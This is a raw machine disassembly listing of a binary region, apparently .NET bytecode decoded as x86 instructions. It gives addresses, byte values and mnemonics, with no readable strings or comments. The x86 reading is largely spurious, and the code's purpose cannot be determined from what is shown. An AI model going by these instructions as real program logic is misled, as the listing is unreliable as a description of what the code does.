  4025e3:	15 00 00 04 6f       	adc    $0x6f040000,%eax
  4025e8:	3b 00                	cmp    (%eax),%eax
  4025ea:	00 0a                	add    %cl,(%edx)
  4025ec:	26 dc 06             	faddl  %es:(%esi)
  4025ef:	2a 41 34             	sub    0x34(%ecx),%al
	...
  4025fa:	00 00                	add    %al,(%eax)
  4025fc:	0e                   	push   %cs
  4025fd:	01 00                	add    %eax,(%eax)
  4025ff:	00 0e                	add    %cl,(%esi)
  402601:	01 00                	add    %eax,(%eax)
  402603:	00 14 00             	add    %dl,(%eax,%eax,1)
  402606:	00 00                	add    %al,(%eax)
  402608:	25 00 00 01 02       	and    $0x2010000,%eax
  40260d:	00 00                	add    %al,(%eax)
  40260f:	00 00                	add    %al,(%eax)
  402611:	00 00                	add    %al,(%eax)
  402613:	00 22                	add    %ah,(%edx)
  402615:	01 00                	add    %eax,(%eax)
  402617:	00 22                	add    %ah,(%edx)
  402619:	01 00                	add    %eax,(%eax)
  40261b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40261e:	00 00                	add    %al,(%eax)
  402620:	00 00                	add    %al,(%eax)
  402622:	00 00                	add    %al,(%eax)
  402624:	13 30                	adc    (%eax),%esi
  402626:	05 00 58 01 00       	add    $0x15800,%eax
  40262b:	00 0f                	add    %cl,(%edi)
  40262d:	00 00                	add    %al,(%eax)
  40262f:	11 73 3c             	adc    %esi,0x3c(%ebx)
  402632:	00 00                	add    %al,(%eax)
  402634:	0a 0b                	or     (%ebx),%cl
  402636:	1f                   	pop    %ds
  402637:	1b 8d 03 00 00 01    	sbb    0x1000003(%ebp),%ecx
  40263d:	0d 09 16 72 a3       	or     $0xa3721609,%eax
  402642:	01 00                	add    %eax,(%eax)
  402644:	70 a2                	jo     0x4025e8
  402646:	09 17                	or     %edx,(%edi)
  402648:	7e 0a                	jle    0x402654
  40264a:	00 00                	add    %al,(%eax)
  40264c:	04 a2                	add    $0xa2,%al
  40264e:	09 18                	or     %ebx,(%eax)
  402650:	28 4d 00             	sub    %cl,0x0(%ebp)
  402653:	00 06                	add    %al,(%esi)
  402655:	a2 09 19 7e 0a       	mov    %al,0xa7e1909
  40265a:	00 00                	add    %al,(%eax)
  40265c:	04 a2                	add    $0xa2,%al
  40265e:	09 1a                	or     %ebx,(%edx)
  402660:	28 3d 00 00 0a a2    	sub    %bh,0xa20a0000
  402666:	09 1b                	or     %ebx,(%ebx)
  402668:	7e 0a                	jle    0x402674
  40266a:	00 00                	add    %al,(%eax)
  40266c:	04 a2                	add    $0xa2,%al
  40266e:	09 1c 07             	or     %ebx,(%edi,%eax,1)
  402671:	6f                   	outsl  %ds:(%esi),(%dx)
  402672:	3e 00 00             	add    %al,%ds:(%eax)
  402675:	0a 72 ad             	or     -0x53(%edx),%dh
  402678:	01 00                	add    %eax,(%eax)
  40267a:	70 14                	jo     0x402690
  40267c:	6f                   	outsl  %ds:(%esi),(%dx)
  40267d:	3f                   	aas
  40267e:	00 00                	add    %al,(%eax)
  402680:	0a a2 09 1d 28 40    	or     0x40281d09(%edx),%ah
  402686:	00 00                	add    %al,(%eax)
  402688:	0a 6f 41             	or     0x41(%edi),%ch
  40268b:	00 00                	add    %al,(%eax)
  40268d:	0a 72 c1             	or     -0x3f(%edx),%dh
  402690:	01 00                	add    %eax,(%eax)
  402692:	70 72                	jo     0x402706
  402694:	db 01                	fildl  (%ecx)
  402696:	00 70 6f             	add    %dh,0x6f(%eax)
  402699:	3f                   	aas
  40269a:	00 00                	add    %al,(%eax)
  40269c:	0a 72 e1             	or     -0x1f(%edx),%dh
  40269f:	01 00                	add    %eax,(%eax)
  4026a1:	70 28                	jo     0x4026cb
  4026a3:	42                   	inc    %edx
  4026a4:	00 00                	add    %al,(%eax)
  4026a6:	0a a2 09 1e 28 43    	or     0x43281e09(%edx),%ah
  4026ac:	00 00                	add    %al,(%eax)
  4026ae:	0a 0c 12             	or     (%edx,%edx,1),%cl
  4026b1:	02 28                	add    (%eax),%ch
  4026b3:	44                   	inc    %esp
  4026b4:	00 00                	add    %al,(%eax)
  4026b6:	0a 72 e5             	or     -0x1b(%edx),%dh
  4026b9:	01 00                	add    %eax,(%eax)
  4026bb:	70 72                	jo     0x40272f
  4026bd:	f1                   	int1
  4026be:	01 00                	add    %eax,(%eax)
  4026c0:	70 6f                	jo     0x402731
  4026c2:	3f                   	aas
  4026c3:	00 00                	add    %al,(%eax)
  4026c5:	0a 72 fd             	or     -0x3(%edx),%dh
  4026c8:	01 00                	add    %eax,(%eax)
  4026ca:	70 72                	jo     0x40273e
  4026cc:	07                   	pop    %es
  4026cd:	02 00                	add    (%eax),%al
  4026cf:	70 6f                	jo     0x402740
  4026d1:	3f                   	aas
  4026d2:	00 00                	add    %al,(%eax)
  4026d4:	0a a2 09 1f 09 7e    	or     0x7e091f09(%edx),%ah
  4026da:	0a 00                	or     (%eax),%al
  4026dc:	00 04 a2             	add    %al,(%edx,%eiz,4)
  4026df:	09 1f                	or     %ebx,(%edi)
  4026e1:	0a 7e 0c             	or     0xc(%esi),%bh
  4026e4:	00 00                	add    %al,(%eax)
  4026e6:	04 a2                	add    $0xa2,%al
  4026e8:	09 1f                	or     %ebx,(%edi)
  4026ea:	0b 7e 0a             	or     0xa(%esi),%edi
  4026ed:	00 00                	add    %al,(%eax)
  4026ef:	04 a2                	add    $0xa2,%al
  4026f1:	09 1f                	or     %ebx,(%edi)
  4026f3:	0c 28                	or     $0x28,%al
  4026f5:	1c 00                	sbb    $0x0,%al
  4026f7:	00 06                	add    %al,(%esi)
  4026f9:	a2 09 1f 0d 7e       	mov    %al,0x7e0d1f09
  4026fe:	0a 00                	or     (%eax),%al
  402700:	00 04 a2             	add    %al,(%edx,%eiz,4)
  402703:	09 1f                	or     %ebx,(%edi)
  402705:	0e                   	push   %cs
  402706:	28 1d 00 00 06 a2    	sub    %bl,0xa2060000
  40270c:	09 1f                	or     %ebx,(%edi)
  40270e:	0f 7e 0a             	movd   %mm1,(%edx)
  402711:	00 00                	add    %al,(%eax)
  402713:	04 a2                	add    $0xa2,%al
  402715:	09 1f                	or     %ebx,(%edi)
  402717:	10 28                	adc    %ch,(%eax)
  402719:	1e                   	push   %ds
  40271a:	00 00                	add    %al,(%eax)
  40271c:	06                   	push   %es
  40271d:	a2 09 1f 11 7e       	mov    %al,0x7e111f09
  402722:	0a 00                	or     (%eax),%al
  402724:	00 04 a2             	add    %al,(%edx,%eiz,4)
  402727:	09 1f                	or     %ebx,(%edi)
  402729:	12 28                	adc    (%eax),%ch
  40272b:	36 00 00             	add    %al,%ss:(%eax)
  40272e:	06                   	push   %es
  40272f:	8c 38                	mov    %?,(%eax)
  402731:	00 00                	add    %al,(%eax)
  402733:	01 a2 09 1f 13 7e    	add    %esp,0x7e131f09(%edx)
  402739:	0a 00                	or     (%eax),%al
  40273b:	00 04 a2             	add    %al,(%edx,%eiz,4)
  40273e:	09 1f                	or     %ebx,(%edi)
  402740:	14 28                	adc    $0x28,%al
  402742:	21 00                	and    %eax,(%eax)
  402744:	00 06                	add    %al,(%esi)
  402746:	a2 09 1f 15 7e       	mov    %al,0x7e151f09
  40274b:	0a 00                	or     (%eax),%al
  40274d:	00 04 a2             	add    %al,(%edx,%eiz,4)
  402750:	09 1f                	or     %ebx,(%edi)
  402752:	16                   	push   %ss
  402753:	28 20                	sub    %ah,(%eax)
  402755:	00 00                	add    %al,(%eax)
  402757:	06                   	push   %es
  402758:	a2 09 1f 17 7e       	mov    %al,0x7e171f09
  40275d:	0a 00                	or     (%eax),%al
  40275f:	00 04 a2             	add    %al,(%edx,%eiz,4)
  402762:	09 1f                	or     %ebx,(%edi)
  402764:	18 28                	sbb    %ch,(%eax)
  402766:	22 00                	and    (%eax),%al
  402768:	00 06                	add    %al,(%esi)
  40276a:	a2 09 1f 19 7e       	mov    %al,0x7e191f09
  40276f:	0a 00                	or     (%eax),%al
  402771:	00 04 a2             	add    %al,(%edx,%eiz,4)
  402774:	09 1f                	or     %ebx,(%edi)
  402776:	1a 28                	sbb    (%eax),%ch
  402778:	1f                   	pop    %ds
  402779:	00 00                	add    %al,(%eax)
  40277b:	06                   	push   %es
  40277c:	a2 09 28 45 00       	mov    %al,0x452809
  402781:	00 0a                	add    %cl,(%edx)
  402783:	0a 2b                	or     (%ebx),%ch
  402785:	00 06                	add    %al,(%esi)
  402787:	2a 1b                	sub    (%ebx),%bl
  402789:	30 02                	xor    %al,(%edx)
  40278b:	00 40 00             	add    %al,0x0(%eax)
  40278e:	00 00                	add    %al,(%eax)
  402790:	10 00                	adc    %al,(%eax)
  402792:	00 11                	add    %dl,(%ecx)
  402794:	7e 23                	jle    0x4027b9
  402796:	00 00                	add    %al,(%eax)
  402798:	04 73                	add    $0x73,%al
  40279a:	46                   	inc    %esi
  40279b:	00 00                	add    %al,(%eax)
  40279d:	0a 0b                	or     (%ebx),%cl
  40279f:	07                   	pop    %es
  4027a0:	6f                   	outsl  %ds:(%esi),(%dx)
  4027a1:	47                   	inc    %edi
  4027a2:	00 00                	add    %al,(%eax)
  4027a4:	0a 0d 12 03 72 13    	or     0x13720312,%cl
  4027aa:	02 00                	add    (%eax),%al
  4027ac:	70 28                	jo     0x4027d6
  4027ae:	48                   	dec    %eax
  4027af:	00 00                	add    %al,(%eax)
  4027b1:	0a 0a                	or     (%edx),%cl
  4027b3:	de 1d de 1b 25 28    	ficomps 0x28251bde
  4027b9:	22 00                	and    (%eax),%al
  4027bb:	00 0a                	add    %cl,(%edx)
  4027bd:	0c 72                	or     $0x72,%al
  4027bf:	27                   	daa
  4027c0:	02 00                	add    (%eax),%al
  4027c2:	70 0a                	jo     0x4027ce
  4027c4:	28 24 00             	sub    %ah,(%eax,%eax,1)
  4027c7:	00 0a                	add    %cl,(%edx)
  4027c9:	de 07                	fiadds (%edi)
  4027cb:	28 24 00             	sub    %ah,(%eax,%eax,1)
  4027ce:	00 0a                	add    %cl,(%edx)
  4027d0:	de 00                	fiadds (%eax)
  4027d2:	06                   	push   %es
  4027d3:	2a 01                	sub    (%ecx),%al
  4027d5:	10 00                	adc    %al,(%eax)
  4027d7:	00 00                	add    %al,(%eax)
  4027d9:	00 00                	add    %al,(%eax)
  4027db:	00 23                	add    %ah,(%ebx)
  4027dd:	23 00                	and    (%eax),%eax
  4027df:	1b 25 00 00 01 1b    	sbb    0x1b010000,%esp
  4027e5:	30 03                	xor    %al,(%ebx)
  4027e7:	00 49 00             	add    %cl,0x0(%ecx)
  4027ea:	00 00                	add    %al,(%eax)
  4027ec:	11 00                	adc    %eax,(%eax)
  4027ee:	00 11                	add    %dl,(%ecx)
  4027f0:	7e 23                	jle    0x402815
  4027f2:	00 00                	add    %al,(%eax)
  4027f4:	04 28                	add    $0x28,%al
  4027f6:	49                   	dec    %ecx
  4027f7:	00 00                	add    %al,(%eax)
  4027f9:	0a 7e 0d             	or     0xd(%esi),%bh
  4027fc:	00 00                	add    %al,(%eax)
  4027fe:	04 16                	add    $0x16,%al
  402800:	28 4a 00             	sub    %cl,0x0(%edx)
  402803:	00 0a                	add    %cl,(%edx)
  402805:	16                   	push   %ss
  402806:	33 0a                	xor    (%edx),%ecx
  402808:	72 fd                	jb     0x402807
  40280a:	01 00                	add    %eax,(%eax)
  40280c:	70 0a                	jo     0x402818
  40280e:	de 27                	fisubs (%edi)
  402810:	2b 08                	sub    (%eax),%ecx
  402812:	72 e5                	jb     0x4027f9
  402814:	01 00                	add    %eax,(%eax)
  402816:	70 0a                	jo     0x402822
  402818:	de 1d de 1b 25 28    	ficomps 0x28251bde
  40281e:	22 00                	and    (%eax),%al
  402820:	00 0a                	add    %cl,(%edx)
  402822:	0b 72 27             	or     0x27(%edx),%esi
  402825:	02 00                	add    (%eax),%al
  402827:	70 0a                	jo     0x402833
  402829:	28 24 00             	sub    %ah,(%eax,%eax,1)
  40282c:	00 0a                	add    %cl,(%edx)
  40282e:	de 07                	fiadds (%edi)
  402830:	28 24 00             	sub    %ah,(%eax,%eax,1)
  402833:	00 0a                	add    %cl,(%edx)
  402835:	de 00                	fiadds (%eax)
  402837:	06                   	push   %es
  402838:	2a 00                	sub    (%eax),%al
  40283a:	00 00                	add    %al,(%eax)
  40283c:	01 10                	add    %edx,(%eax)
  40283e:	00 00                	add    %al,(%eax)
  402840:	00 00                	add    %al,(%eax)
  402842:	00 00                	add    %al,(%eax)
  402844:	2c 2c                	sub    $0x2c,%al
  402846:	00 1b                	add    %bl,(%ebx)
  402848:	25 00 00 01 1b       	and    $0x1b010000,%eax
  40284d:	30 02                	xor    %al,(%edx)
  40284f:	00 3e                	add    %bh,(%esi)
  402851:	00 00                	add    %al,(%eax)
  402853:	00 12                	add    %dl,(%edx)
  402855:	00 00                	add    %al,(%eax)
  402857:	11 28                	adc    %ebp,(%eax)
  402859:	4b                   	dec    %ebx
  40285a:	00 00                	add    %al,(%eax)
  40285c:	0a 73 4c             	or     0x4c(%ebx),%dh
  40285f:	00 00                	add    %al,(%eax)
  402861:	0a 20                	or     (%eax),%ah
  402863:	20 02                	and    %al,(%edx)
  402865:	00 00                	add    %al,(%eax)
  402867:	6f                   	outsl  %ds:(%esi),(%dx)
  402868:	4d                   	dec    %ebp
  402869:	00 00                	add    %al,(%eax)
  40286b:	0a 0c 12             	or     (%edx,%edx,1),%cl
  40286e:	02 28                	add    (%eax),%ch
  402870:	44                   	inc    %esp
  402871:	00 00                	add    %al,(%eax)
  402873:	0a 0a                	or     (%edx),%cl
  402875:	de 1d de 1b 25 28    	ficomps 0x28251bde
  40287b:	22 00                	and    (%eax),%al
  40287d:	00 0a                	add    %cl,(%edx)
  40287f:	0b 72 27             	or     0x27(%edx),%esi
  402882:	02 00                	add    (%eax),%al
  402884:	70 0a                	jo     0x402890
  402886:	28 24 00             	sub    %ah,(%eax,%eax,1)
  402889:	00 0a                	add    %cl,(%edx)
  40288b:	de 07                	fiadds (%edi)
  40288d:	28 24 00             	sub    %ah,(%eax,%eax,1)
  402890:	00 0a                	add    %cl,(%edx)
  402892:	de 00                	fiadds (%eax)
  402894:	06                   	push   %es
  402895:	2a 00                	sub    (%eax),%al
  402897:	00 01                	add    %al,(%ecx)
  402899:	10 00                	adc    %al,(%eax)
  40289b:	00 00                	add    %al,(%eax)
  40289d:	00 00                	add    %al,(%eax)
  40289f:	00 21                	add    %ah,(%ecx)
  4028a1:	21 00                	and    %eax,(%eax)
  4028a3:	1b 25 00 00 01 1b    	sbb    0x1b010000,%esp
  4028a9:	30 04 00             	xor    %al,(%eax,%eax,1)
  4028ac:	cf                   	iret
  4028ad:	00 00                	add    %al,(%eax)
  4028af:	00 13                	add    %dl,(%ebx)
  4028b1:	00 00                	add    %al,(%eax)
  4028b3:	11 72 33             	adc    %esi,0x33(%edx)
  4028b6:	02 00                	add    (%eax),%al
  4028b8:	70 28                	jo     0x4028e2
  4028ba:	4e                   	dec    %esi
  4028bb:	00 00                	add    %al,(%eax)
  4028bd:	0a 72 39             	or     0x39(%edx),%dh
  4028c0:	02 00                	add    (%eax),%al
  4028c2:	70 28                	jo     0x4028ec
  4028c4:	4f                   	dec    %edi
  4028c5:	00 00                	add    %al,(%eax)
  4028c7:	0a 72 65             	or     0x65(%edx),%dh
  4028ca:	02 00                	add    (%eax),%al
  4028cc:	70 73                	jo     0x402941
  4028ce:	50                   	push   %eax
  4028cf:	00 00                	add    %al,(%eax)
  4028d1:	0a 0b                	or     (%ebx),%cl
  4028d3:	73 51                	jae    0x402926
  4028d5:	00 00                	add    %al,(%eax)
  4028d7:	0a 0c 07             	or     (%edi,%eax,1),%cl
  4028da:	6f                   	outsl  %ds:(%esi),(%dx)
  4028db:	52                   	push   %edx
  4028dc:	00 00                	add    %al,(%eax)
  4028de:	0a 6f 53             	or     0x53(%edi),%ch
  4028e1:	00 00                	add    %al,(%eax)
  4028e3:	0a 13                	or     (%ebx),%dl
  4028e5:	05 2b 2b 11 05       	add    $0x5112b2b,%eax
  4028ea:	6f                   	outsl  %ds:(%esi),(%dx)
  4028eb:	54                   	push   %esp
  4028ec:	00 00                	add    %al,(%eax)
  4028ee:	0a 0d 08 09 72 a3    	or     0xa3720908,%cl
  4028f4:	02 00                	add    (%eax),%al
  4028f6:	70 6f                	jo     0x402967
  4028f8:	55                   	push   %ebp
  4028f9:	00 00                	add    %al,(%eax)
  4028fb:	0a 6f 15             	or     0x15(%edi),%ch
  4028fe:	00 00                	add    %al,(%eax)
  402900:	0a 6f 56             	or     0x56(%edi),%ch
  402903:	00 00                	add    %al,(%eax)
  402905:	0a 26                	or     (%esi),%ah
  402907:	08 72 bb             	or     %dh,-0x45(%edx)
  40290a:	02 00                	add    (%eax),%al
  40290c:	70 6f                	jo     0x40297d
  40290e:	56                   	push   %esi
  40290f:	00 00                	add    %al,(%eax)
  402911:	0a 26                	or     (%esi),%ah
  402913:	11 05 6f 57 00 00    	adc    %eax,0x576f
  402919:	0a 2d cc de 0c 11    	or     0x110cdecc,%ch
  40291f:	05 2c 07 11 05       	add    $0x511072c,%eax
  402924:	6f                   	outsl  %ds:(%esi),(%dx)
  402925:	58                   	pop    %eax
  402926:	00 00                	add    %al,(%eax)
  402928:	0a dc                	or     %ah,%bl
  40292a:	08 6f 59             	or     %ch,0x59(%edi)
  40292d:	00 00                	add    %al,(%eax)
  40292f:	0a 6f 5a             	or     0x5a(%edi),%ch
  402932:	00 00                	add    %al,(%eax)
  402934:	0a 16                	or     (%esi),%dl
  402936:	33 08                	xor    (%eax),%ecx
  402938:	72 bf                	jb     0x4028f9
  40293a:	02 00                	add    (%eax),%al
  40293c:	70 0a                	jo     0x402948
  40293e:	de 41 08             	fiadds 0x8(%ecx)
  402941:	6f                   	outsl  %ds:(%esi),(%dx)
  402942:	59                   	pop    %ecx
  402943:	00 00                	add    %al,(%eax)
  402945:	0a 16                	or     (%esi),%dl
  402947:	08 6f 5b             	or     %ch,0x5b(%edi)
  40294a:	00 00                	add    %al,(%eax)
  40294c:	0a 17                	or     (%edi),%dl
  40294e:	da 6f 5c             	fisubrl 0x5c(%edi)
  402951:	00 00                	add    %al,(%eax)
  402953:	0a 0a                	or     (%edx),%cl
  402955:	de 2a                	fisubrs (%edx)
  402957:	de 0a                	fimuls (%edx)
  402959:	07                   	pop    %es
  40295a:	2c 06                	sub    $0x6,%al
  40295c:	07                   	pop    %es
  40295d:	6f                   	outsl  %ds:(%esi),(%dx)
  40295e:	58                   	pop    %eax
  40295f:	00 00                	add    %al,(%eax)
  402961:	0a dc                	or     %ah,%bl
  402963:	de 1c 25 28 22 00 00 	ficomps 0x2228(,%eiz,1)
  40296a:	0a 13                	or     (%ebx),%dl
  40296c:	04 72                	add    $0x72,%al
  40296e:	bf 02 00 70 0a       	mov    $0xa700002,%edi
  402973:	28 24 00             	sub    %ah,(%eax,%eax,1)
  402976:	00 0a                	add    %cl,(%edx)
  402978:	de 07                	fiadds (%edi)
  40297a:	28 24 00             	sub    %ah,(%eax,%eax,1)
  40297d:	00 0a                	add    %cl,(%edx)
  40297f:	de 00                	fiadds (%eax)
  402981:	06                   	push   %es
  402982:	2a 00                	sub    (%eax),%al
  402984:	01 28                	add    %ebp,(%eax)
  402986:	00 00                	add    %al,(%eax)
  402988:	02 00                	add    (%eax),%al
  40298a:	25 00 45 6a 00       	and    $0x6a4500,%eax
  40298f:	0c 00                	or     $0x0,%al
  402991:	00 00                	add    %al,(%eax)
  402993:	00 02                	add    %al,(%edx)
  402995:	00 1f                	add    %bl,(%edi)
  402997:	00 86 a5 00 0a 00    	add    %al,0xa00a5(%esi)
  40299d:	00 00                	add    %al,(%eax)
  40299f:	00 00                	add    %al,(%eax)
  4029a1:	00 00                	add    %al,(%eax)
  4029a3:	00 b1 b1 00 1c 25    	add    %dh,0x251c00b1(%ecx)
  4029a9:	00 00                	add    %al,(%eax)
  4029ab:	01 1b                	add    %ebx,(%ebx)
  4029ad:	30 03                	xor    %al,(%ebx)
  4029af:	00 8f 00 00 00 14    	add    %cl,0x14000000(%edi)
  4029b5:	00 00                	add    %al,(%eax)
  4029b7:	11 7e 5d             	adc    %edi,0x5d(%esi)
  4029ba:	00 00                	add    %al,(%eax)
  4029bc:	0a 0d 72 c9 02 00    	or     0x2c972,%cl
  4029c2:	70 73                	jo     0x402a37
  4029c4:	5e                   	pop    %esi
  4029c5:	00 00                	add    %al,(%eax)
  4029c7:	0a 0b                	or     (%ebx),%cl
  4029c9:	07                   	pop    %es
  4029ca:	73 5f                	jae    0x402a2b
  4029cc:	00 00                	add    %al,(%eax)
  4029ce:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4029d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4029d2:	52                   	push   %edx
  4029d3:	00 00                	add    %al,(%eax)
  4029d5:	0a 6f 53             	or     0x53(%edi),%ch
  4029d8:	00 00                	add    %al,(%eax)
  4029da:	0a 13                	or     (%ebx),%dl
  4029dc:	05 2b 30 11 05       	add    $0x511302b,%eax
  4029e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4029e2:	54                   	push   %esp
  4029e3:	00 00                	add    %al,(%eax)
  4029e5:	0a 74 47 00          	or     0x0(%edi,%eax,2),%dh
  4029e9:	00 01                	add    %al,(%ecx)
  4029eb:	13 04 09             	adc    (%ecx,%ecx,1),%eax
  4029ee:	11 04 72             	adc    %eax,(%edx,%esi,2)
  4029f1:	11 03                	adc    %eax,(%ebx)
  4029f3:	00 70 6f             	add    %dh,0x6f(%eax)
  4029f6:	55                   	push   %ebp
  4029f7:	00 00                	add    %al,(%eax)
  4029f9:	0a 28                	or     (%eax),%ch
  4029fb:	60                   	pusha
  4029fc:	00 00                	add    %al,(%eax)
  4029fe:	0a 72 e1             	or     -0x1f(%edx),%dh
  402a01:	01 00                	add    %eax,(%eax)
  402a03:	70 28                	jo     0x402a2d
  402a05:	60                   	pusha
  402a06:	00 00                	add    %al,(%eax)
  402a08:	0a 28                	or     (%eax),%ch
  402a0a:	21 00                	and    %eax,(%eax)
  402a0c:	00 0a                	add    %cl,(%edx)
  402a0e:	0d 11 05 6f 57       	or     $0x576f0511,%eax
  402a13:	00 00                	add    %al,(%eax)
  402a15:	0a 2d c7 de 0c 11    	or     0x110cdec7,%ch
  402a1b:	05 2c 07 11 05       	add    $0x511072c,%eax
  402a20:	6f                   	outsl  %ds:(%esi),(%dx)
  402a21:	58                   	pop    %eax
  402a22:	00 00                	add    %al,(%eax)
  402a24:	0a dc                	or     %ah,%bl
  402a26:	09 0a                	or     %ecx,(%edx)
  402a28:	de 1b                	ficomps (%ebx)
  402a2a:	de 19                	ficomps (%ecx)
  402a2c:	28 22                	sub    %ah,(%edx)
  402a2e:	00 00                	add    %al,(%eax)
  402a30:	0a 72 27             	or     0x27(%edx),%dh
  402a33:	02 00                	add    (%eax),%al
  402a35:	70 0a                	jo     0x402a41
  402a37:	28 24 00             	sub    %ah,(%eax,%eax,1)
  402a3a:	00 0a                	add    %cl,(%edx)
  402a3c:	de 07                	fiadds (%edi)
  402a3e:	28 24 00             	sub    %ah,(%eax,%eax,1)
  402a41:	00 0a                	add    %cl,(%edx)
  402a43:	de 00                	fiadds (%eax)
  402a45:	06                   	push   %es
  402a46:	2a 00                	sub    (%eax),%al
  402a48:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  402a4b:	00 02                	add    %al,(%edx)
  402a4d:	00 18                	add    %bl,(%eax)
  402a4f:	00 4a 62             	add    %cl,0x62(%edx)
  402a52:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402a55:	00 00                	add    %al,(%eax)
  402a57:	00 00                	add    %al,(%eax)
  402a59:	00 00                	add    %al,(%eax)
  402a5b:	00 74 74 00          	add    %dh,0x0(%esp,%esi,2)
  402a5f:	19 25 00 00 01 1b    	sbb    %esp,0x1b010000
  402a65:	30 03                	xor    %al,(%ebx)
  402a67:	00 83 00 00 00 15    	add    %al,0x15000000(%ebx)
  402a6d:	00 00                	add    %al,(%eax)
  402a6f:	11 72 1b             	adc    %esi,0x1b(%edx)
  402a72:	03 00                	add    (%eax),%eax
  402a74:	70 73                	jo     0x402ae9
  402a76:	61                   	popa
  402a77:	00 00                	add    %al,(%eax)
  402a79:	0a 0b                	or     (%ebx),%cl
  402a7b:	07                   	pop    %es
  402a7c:	6f                   	outsl  %ds:(%esi),(%dx)
  402a7d:	62 00                	bound  %eax,(%eax)
  402a7f:	00 0a                	add    %cl,(%edx)
  402a81:	07                   	pop    %es
  402a82:	72 11                	jb     0x402a95
  402a84:	03 00                	add    (%eax),%eax
  402a86:	70 6f                	jo     0x402af7
  402a88:	55                   	push   %ebp
  402a89:	00 00                	add    %al,(%eax)
  402a8b:	0a 6f 15             	or     0x15(%edi),%ch
  402a8e:	00 00                	add    %al,(%eax)
  402a90:	0a 72 5b             	or     0x5b(%edx),%dh
  402a93:	03 00                	add    (%eax),%eax
  402a95:	70 72                	jo     0x402b09
  402a97:	63 03                	arpl   %eax,(%ebx)
  402a99:	00 70 6f             	add    %dh,0x6f(%eax)
  402a9c:	3f                   	aas
  402a9d:	00 00                	add    %al,(%eax)
  402a9f:	0a 72 65             	or     0x65(%edx),%dh
  402aa2:	03 00                	add    (%eax),%eax
  402aa4:	70 72                	jo     0x402b18
  402aa6:	63 03                	arpl   %eax,(%ebx)
  402aa8:	00 70 6f             	add    %dh,0x6f(%eax)
  402aab:	3f                   	aas
  402aac:	00 00                	add    %al,(%eax)
  402aae:	0a 72 77             	or     0x77(%edx),%dh
  402ab1:	03 00                	add    (%eax),%eax
  402ab3:	70 72                	jo     0x402b27
  402ab5:	63 03                	arpl   %eax,(%ebx)
  402ab7:	00 70 6f             	add    %dh,0x6f(%eax)
  402aba:	3f                   	aas
  402abb:	00 00                	add    %al,(%eax)
  402abd:	0a 0a                	or     (%edx),%cl
  402abf:	de 30                	fidivs (%eax)
  402ac1:	07                   	pop    %es
  402ac2:	72 11                	jb     0x402ad5
  402ac4:	03 00                	add    (%eax),%eax
  402ac6:	70 6f                	jo     0x402b37
  402ac8:	55                   	push   %ebp
  402ac9:	00 00                	add    %al,(%eax)
  402acb:	0a 6f 15             	or     0x15(%edi),%ch
  402ace:	00 00                	add    %al,(%eax)
  402ad0:	0a 0a                	or     (%edx),%cl
  402ad2:	de 1d de 1b 25 28    	ficomps 0x28251bde
  402ad8:	22 00                	and    (%eax),%al
  402ada:	00 0a                	add    %cl,(%edx)
  402adc:	0c 72                	or     $0x72,%al
  402ade:	27                   	daa
  402adf:	02 00                	add    (%eax),%al
  402ae1:	70 0a                	jo     0x402aed
  402ae3:	28 24 00             	sub    %ah,(%eax,%eax,1)
  402ae6:	00 0a                	add    %cl,(%edx)
  402ae8:	de 07                	fiadds (%edi)
  402aea:	28 24 00             	sub    %ah,(%eax,%eax,1)
  402aed:	00 0a                	add    %cl,(%edx)
  402aef:	de 00                	fiadds (%eax)
  402af1:	06                   	push   %es
  402af2:	2a 00                	sub    (%eax),%al
  402af4:	01 10                	add    %edx,(%eax)
  402af6:	00 00                	add    %al,(%eax)
  402af8:	00 00                	add    %al,(%eax)
  402afa:	00 00                	add    %al,(%eax)
  402afc:	66 66 00 1b          	data16 data16 add %bl,(%ebx)
  402b00:	25 00 00 01 1b       	and    $0x1b010000,%eax
  402b05:	30 04 00             	xor    %al,(%eax,%eax,1)
  402b08:	b9 00 00 00 16       	mov    $0x16000000,%ecx
  402b0d:	00 00                	add    %al,(%eax)
  402b0f:	11 14 0c             	adc    %edx,(%esp,%ecx,1)
  402b12:	28 04 00             	sub    %al,(%eax,%eax,1)
  402b15:	00 06                	add    %al,(%esi)
  402b17:	6f                   	outsl  %ds:(%esi),(%dx)
  402b18:	63 00                	arpl   %eax,(%eax)
  402b1a:	00 0a                	add    %cl,(%edx)
  402b1c:	6f                   	outsl  %ds:(%esi),(%dx)
  402b1d:	64 00 00             	add    %al,%fs:(%eax)
  402b20:	0a 8c 49 00 00 01 28 	or     0x28010000(%ecx,%ecx,2),%cl
  402b27:	65 00 00             	add    %al,%gs:(%eax)
  402b2a:	0a 28                	or     (%eax),%ch
  402b2c:	66 00 00             	data16 add %al,(%eax)
  402b2f:	0a b9 0b 07 20 00    	or     0x20070b(%ecx),%bh
  402b35:	00 00                	add    %al,(%eax)
  402b37:	40                   	inc    %eax
  402b38:	6a 31                	push   $0x31
  402b3a:	32 07                	xor    (%edi),%al
  402b3c:	6c                   	insb   (%dx),%es:(%edi)
  402b3d:	23 00                	and    (%eax),%eax
  402b3f:	00 00                	add    %al,(%eax)
  402b41:	00 00                	add    %al,(%eax)
  402b43:	00 d0                	add    %dl,%al
  402b45:	41                   	inc    %ecx
  402b46:	5b                   	pop    %ebx
  402b47:	13 04 12             	adc    (%edx,%edx,1),%eax
  402b4a:	04 28                	add    $0x28,%al
  402b4c:	67 00 00             	add    %al,(%bx,%si)
  402b4f:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  402b52:	1a 08                	sbb    (%eax),%cl
  402b54:	6f                   	outsl  %ds:(%esi),(%dx)
  402b55:	5a                   	pop    %edx
  402b56:	00 00                	add    %al,(%eax)
  402b58:	0a 1a                	or     (%edx),%bl
  402b5a:	da 6f 68             	fisubrl 0x68(%edi)
  402b5d:	00 00                	add    %al,(%eax)
  402b5f:	0a 72 7f             	or     0x7f(%edx),%dh
  402b62:	03 00                	add    (%eax),%eax
  402b64:	70 28                	jo     0x402b8e
  402b66:	42                   	inc    %edx
  402b67:	00 00                	add    %al,(%eax)
  402b69:	0a 0c 2b             	or     (%ebx,%ebp,1),%cl
  402b6c:	39 07                	cmp    %eax,(%edi)
  402b6e:	20 00                	and    %al,(%eax)
  402b70:	00 10                	add    %dl,(%eax)
  402b72:	00 6a 31             	add    %ch,0x31(%edx)
  402b75:	30 07                	xor    %al,(%edi)
